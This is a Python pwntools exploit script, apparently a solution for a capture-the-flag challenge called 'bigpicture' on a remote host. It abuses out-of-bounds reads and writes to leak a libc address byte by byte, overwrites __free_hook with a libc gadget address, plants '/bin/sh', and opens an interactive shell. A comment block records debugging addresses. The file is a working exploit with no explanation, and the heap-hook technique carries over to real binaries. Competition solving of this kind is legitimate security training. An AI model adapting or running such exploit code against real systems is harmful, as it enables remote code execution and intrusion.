from pwn import *

p = remote('bigpicture.chal.pwning.xxx', 420)
# p = process('./bigpicture')
p.sendlineafter('How big? ', '100 x 5000')

binsh = '/bin/sh'

for i in range(len(binsh)):
    p.sendlineafter('> ', '{}, {}, {}'.format(0, i, binsh[i]))


'''
[Local]
libc @ 0x00007f96e35e1000

free_hook : 0x7f96e39a67a8
buffer : 0x00007f96e3aa5010

offset is static

0x7f96e39a4030: 0x00007f96e3600806

[Remote]
-1560000: 65 72 72 6f 72 3a 20 25 == error: %

libc @ 0x00007fad499ac000
0x7fad49b3b6a2 - 0x7fad49b3b6ac  ->  "error: %s." // 1636002
0x7fad49d97250 - 0x7fad49d9725a  ->  "error: %s." // 4108880
'''


def read_result(offset):
    p.sendlineafter('> ', '{}, {}, {}'.format(0, offset, '_'))
    p.recvuntil('overwriting ')
    readed = p.recvn(1)
    return ord(readed)


def leak(offset, byte):
    ret = 0
    t = 1
    for i in range(byte):
        ret += t * read_result(offset+i)
        t *= 256
    return ret


def overwrite(offset, value):
    s = p64(value)
    for i in range(len(s)):
        if s[i]:
            p.sendlineafter('> ', '{}, {}, {}'.format(0, offset+i, s[i]))

leak_offset = 1724384

leaked = leak(-leak_offset, 6)
libc = leaked - 129030
log.success('libc: {:#x}'.format(libc))
buf = libc + leak_offset + 3944496
log.success('buf: {:#x}'.format(buf))

log.info('Overwriting free hook')
overwrite((libc + 3954600) - buf, libc + 0x45390)

p.sendlineafter('> ', 'quit')
p.interactive()
